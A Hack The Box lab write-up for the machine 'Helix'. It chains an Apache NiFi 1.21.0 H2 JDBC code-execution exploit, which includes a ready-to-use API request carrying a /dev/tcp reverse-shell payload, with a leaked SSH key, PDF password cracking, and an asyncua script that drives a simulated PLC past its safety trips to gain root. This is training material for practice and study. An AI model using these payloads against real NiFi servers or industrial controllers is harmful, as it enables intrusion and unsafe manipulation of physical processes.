---
title: "HTB Helix — Apache NiFi RCE to an ICS maintenance window"
date: 2026-05-16
platform: Hack The Box
difficulty: Medium
os: Linux
category: Offense
summary: "A hidden Apache NiFi instance gives code execution; root requires reading the plant's own operating manual and driving a simulated PLC over OPC-UA into a privileged maintenance state."
tags: [nifi, h2, opc-ua, ics, jdbc-rce, pdf-cracking, sudo]
---

Helix is a medium-difficulty Linux machine themed around an industrial automation company. The box simulates a small OT environment: Apache NiFi for data flow, an OPC-UA server fronting a PLC simulator, a safety controller, and an HMI dashboard. The intended path depends more on understanding process behaviour than on any single exploit, and it punished me for every assumption I made before reading the documentation on the box.

**Attack path**

1. Virtual-host fuzzing reveals an unauthenticated Apache NiFi 1.21.0 canvas
2. NiFi's H2 database connection is abused for Java code execution → shell as `nifi`
3. A forgotten SSH key backup in NiFi's support bundles → shell as `operator`
4. A password-protected operations manual explains the exact procedure for opening a privileged maintenance window
5. Driving the PLC over OPC-UA in the documented sequence opens the window → `sudo` maintenance console → root

## Reconnaissance

Two open ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx/1.18.0 (Ubuntu)
```

The web server redirected to `helix.htb`. The site was a static corporate page with a contact form whose `submitForm()` handler just closed a modal — no backend call at all, which I confirmed in Burp after wasting time intercepting nothing. Directory busting returned nothing useful.

Virtual-host fuzzing with a wordlist found nothing either, so I tried a short list of industry-themed names by hand:

```bash
for sub in nifi dataflow automation control scada ics opc flow pipeline admin portal; do
    echo -n "$sub: "
    curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
         -H "Host: $sub.helix.htb" http://10.129.245.123
done
```

`flow` returned a 200 with a unique content length; everything else hit the catch-all redirect. `http://flow.helix.htb/nifi/` was an **unauthenticated Apache NiFi 1.21.0** canvas.

```bash
curl -s http://flow.helix.htb/nifi-api/system-diagnostics | python3 -m json.tool | grep niFiVersion
# "niFiVersion": "1.21.0"
```

## Foothold — code execution through NiFi's H2 database

NiFi 1.21.0 is affected by CVE-2023-34468: when a `DBCPConnectionPool` controller service points at an H2 database, the JDBC connection string can be abused to execute arbitrary code. The existing `MaintenanceDB` controller service even told me where the driver lived:

```bash
curl -s "http://flow.helix.htb/nifi-api/controller-services/<MAINTENANCEDB_ID>" \
  | python3 -m json.tool | grep "driver-locations"
# "/opt/nifi-1.21.0/lib/h2-2.1.214.jar"
```

My first attempts used the `INIT=RUNSCRIPT FROM 'http://...'` trick in the JDBC URL. H2 2.x disables remote script fetching by default, so that went nowhere. What worked was staying inside SQL: H2's `CREATE ALIAS` lets you define a Java method inline, and an `ExecuteSQL` processor pointed at the existing H2 service will happily run it.

```bash
PGID="<PROCESS_GROUP_ID>"
MAINDB="<MAINTENANCEDB_ID>"

curl -s -X POST "http://flow.helix.htb/nifi-api/process-groups/$PGID/processors" \
  -H "Content-Type: application/json" \
  -d '{
    "revision": {"version": 0},
    "component": {
      "type": "org.apache.nifi.processors.standard.ExecuteSQL",
      "name": "rce",
      "position": {"x": 400, "y": 400},
      "config": {
        "properties": {
          "Database Connection Pooling Service": "'"$MAINDB"'",
          "SQL select query": "CREATE ALIAS IF NOT EXISTS RCE AS $$ String rce(String[] c) throws Exception { Runtime.getRuntime().exec(c); return \"x\"; } $$; CALL RCE(ARRAY[\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/LHOST/4444 0>&1\"])"
        },
        "autoTerminatedRelationships": ["success", "failure"],
        "schedulingStrategy": "TIMER_DRIVEN",
        "schedulingPeriod": "5 sec"
      }
    }
  }'
```

Start the processor via the API with a listener waiting:

```bash
nc -lvnp 4444

curl -s -X PUT http://flow.helix.htb/nifi-api/processors/<PROCESSOR_ID>/run-status \
  -H "Content-Type: application/json" \
  -d '{"revision": {"version": 0}, "state": "RUNNING"}'
```

Shell as `nifi`. One NiFi-specific gotcha: every write to the API needs the *current* revision number, and a stale one returns a 409. I learned to fetch the revision before each call rather than assuming it.

## Post-exploitation as `nifi`

The process list showed the custom ICS stack:

| Process | Runs as | Listens on |
|---|---|---|
| `/opt/helix/bin/helix-plc` — PLC simulator | `plc` | `127.0.0.1:4840` (OPC-UA) |
| `/opt/helix/bin/helix-safety` — safety controller | `root` | — |
| `/opt/helix/bin/helix-hmi` — HMI dashboard | `www-data` | `127.0.0.1:8081` |

The HMI showed a reactor panel — temperature around 284 °C, pressure around 69 bar — and a **Privileged Maintenance Window** section reading `CLOSED: No maintenance window file present`. The stated condition for the window was *"Temp ≥ 295 °C or Pressure ≥ 73 bar, while still below trip."*

Hours of enumeration later, the real find was a backup file in a place nobody would look:

```bash
find /opt/nifi-1.21.0 -type f -name "*.bak" 2>/dev/null
# /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

An Ed25519 private key for the `operator` user, left behind in NiFi's support-bundle directory.

## Lateral movement to `operator`

```bash
cp /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak /dev/shm/op_key
chmod 600 /dev/shm/op_key
ssh -i /dev/shm/op_key operator@localhost
```

That gave the user flag and, more importantly, a sudo rule and a document:

```
sudo -l
# (root) NOPASSWD: /usr/local/sbin/helix-maint-console

ls ~
# 'Operator Control & Safety Guide.pdf'   (password protected)
# 'control systems diagram.png'
```

Running the console returned `Maintenance window CLOSED.` So the PDF was the next step.

```bash
# exfil as base64, then on the attack box:
pdf2john guide.pdf > pdf.hash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
john pdf.hash --show --format=PDF
```

The password cracked quickly. Section 7 of the manual was the whole box:

> **Maintenance Operating Window** — opens when temperature reaches ~295 °C *or* pressure reaches 73 bar, while remaining below trip thresholds with no safety trip active. Maintenance operations require explicit operator action: (1) switch Mode to **MAINTENANCE**, (2) enable **TestOverride**, (3) begin controlled adjustment using **CalibrationOffset**.

I had been trying this for hours with Mode set to `TEST`, because the HMI text mentioned "hazardous test conditions." The manual said `MAINTENANCE`. Read the documentation first.

## Privilege escalation — driving the PLC over OPC-UA

The box had no internet access, so I pushed `asyncua` and its dependencies over as wheels and installed them into a venv under `/dev/shm` (the root filesystem was full):

```bash
# attack box
pip3 download asyncua==0.9.98 python_dateutil six sortedcontainers aiofiles pytz -d /tmp/opcua_pkgs
cd /tmp/opcua_pkgs && python3 -m http.server 9999

# target
mkdir /dev/shm/pkgs && cd /dev/shm/pkgs && for f in *.whl; do curl -O http://ATTACKER_IP:9999/$f; done
python3 -m venv /dev/shm/venv
/dev/shm/venv/bin/pip install --no-index --find-links /dev/shm/pkgs asyncua python_dateutil six sortedcontainers aiofiles pytz --no-deps
```

Browsing namespace 2 on the OPC-UA server gave the node map: `TemperatureRaw` (i=3), `Temperature` (i=4), `Pressure` (i=5), `CalibrationOffset` (i=6), `TripActive` (i=10), `Mode` (i=12), `TestOverride` (i=13), `ResetTrip` (i=14).

The working script follows the manual's sequence, keeps re-applying the offset (a cleanup service resets every value every five minutes), resets the trip if the safety controller fires, and runs the maintenance console the moment the HMI reports the window open:

```python
import asyncio, subprocess
from asyncua import Client

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as c:
        mode, override, offset_n = (c.get_node(f"ns=2;i={i}") for i in (12, 13, 6))
        raw_n, temp_n, trip_n, reset_n = (c.get_node(f"ns=2;i={i}") for i in (3, 4, 10, 14))

        await mode.write_value("NORMAL"); await override.write_value(False); await offset_n.write_value(0.0)
        await asyncio.sleep(3)

        await mode.write_value("MAINTENANCE")      # step 1
        await override.write_value(True)           # step 2
        while True:                                 # step 3, continuously
            raw = await raw_n.read_value()
            await offset_n.write_value(max(12.0, 296.0 - raw))
            if await trip_n.read_value():
                await offset_n.write_value(0.0); await reset_n.write_value(True)
                await mode.write_value("MAINTENANCE"); await override.write_value(True)
                continue
            hmi = subprocess.run(["curl", "-s", "http://127.0.0.1:8081/"], capture_output=True, text=True).stdout
            if "OPEN" in hmi:
                print(subprocess.run(["sudo", "/usr/local/sbin/helix-maint-console"], capture_output=True, text=True).stdout)
                break
            await asyncio.sleep(1)

asyncio.run(main())
```

```
21:14:07 Temp=296.0 Window=OPEN
[+] Privileged maintenance access granted
[!] Window expires in 120 seconds
root@helix:/home/operator#
```

## Dead ends, honestly

- **The contact form.** Pure front-end. Hours in Burp for nothing.
- **Injected JS files.** `augmented-dom-instrumentation.js` and `postmessage-instrumentation.js` came from my browser extensions, not the target.
- **H2 `RUNSCRIPT FROM http://`.** Disabled in H2 2.x. `CREATE ALIAS` is the way.
- **Mode=TEST.** Wrong mode, many hours. The PDF had the answer the whole time.
- **Kernel exploits.** PwnKit was patched (`pkexec 0.105-33`), DirtyPipe was backported-fixed, and the disk was 100 % full so nothing would compile anyway.
- **NiFi sensitive-property decryption.** Found the key and algorithm, spent a long time trying to decrypt `enc{}` values for an operator DB password. Non-standard format; the SSH key was the intended path.
- **Cracking the internal H2 user hash.** Multiple hashcat modes and custom scripts. Didn't crack, and didn't need to.

## What I took away

- NiFi's REST API is a full control surface. If it's unauthenticated, you own the data flow — and with H2 in the mix, the host.
- OPC-UA is approachable: nodes in namespaces, read/write values, subscriptions for keepalive. Knowing the basics made the ICS part of this box tractable.
- In OT environments the operations manual *is* the exploit documentation. Read every document on the target before touching the process.
- Backup and support-bundle directories are where credentials go to be forgotten.
- Check `df -h` before planning anything that needs disk.
- When the box name, theme and tags are all pointing somewhere, stop chasing kernel CVEs and go there.

## Tools

nmap · ffuf · gobuster · Burp Suite · curl · python3 + asyncua · netcat · pdf2john / john · hashcat · linpeas · ssh

## References

- [CVE-2023-34468 — Apache NiFi](https://www.cve.org/CVERecord?id=CVE-2023-34468)
- [Abusing H2 database ALIAS for RCE](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
- [OPC UA — OPC Foundation](https://opcfoundation.org/about/opc-technologies/opc-ua/)
- [opcua-asyncio](https://github.com/FreeOpcUa/opcua-asyncio)
- [MITRE ATT&CK for ICS](https://attack.mitre.org/matrices/ics/)
